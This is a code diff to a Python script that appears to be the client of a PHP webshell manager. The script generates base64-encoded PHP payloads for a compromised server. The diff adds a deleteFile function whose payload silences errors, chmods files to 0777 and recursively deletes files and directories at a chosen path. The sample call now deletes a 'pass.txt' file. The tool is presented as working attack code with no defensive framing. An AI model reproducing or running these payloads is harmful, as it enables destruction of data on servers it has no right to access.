@@ -52,7 +52,6 @@ def getFilelistBase(path):
     }
     getfile("%s");
     """% path
-
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
 
@@ -75,5 +74,47 @@ def getFile(path):
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
 
+def deleteFile(path):
+    """
+    删除文件
+    :param path:
+    :return:
+    """
+    code = """
+    @ini_set("display_errors","0");
+    @set_time_limit(0);
+    @set_magic_quotes_runtime(0);
+    function df($p){
+	    $m=@dir($p);
+	    while(@$f=$m->read()){
+		    $pf=$p."/".$f;
+		    if((is_dir($pf))&&($f!=".")&&($f!="..")){
+			    @chmod($pf,0777);
+			    df($pf);
+		    }
+		    if(is_file($pf)){
+			    @chmod($pf,0777);
+			    @unlink($pf);
+		    }
+	    }
+	    $m->close();
+	    @chmod($p,0777);
+	    return @rmdir($p);
+    }
+    function delf($path){
+	    echo("<ek>");
+	    if(is_dir($path)){
+		    echo(df($path));
+	    }
+	    else{
+		    echo(file_exists($path)?@unlink($path)?"1":"0":"0");
+	    };
+	    echo("</ek>");
+	    die();	
+    }
+    delf("%s");""" % path
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
 if __name__ == '__main__':
-    print(getFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
+    print(deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
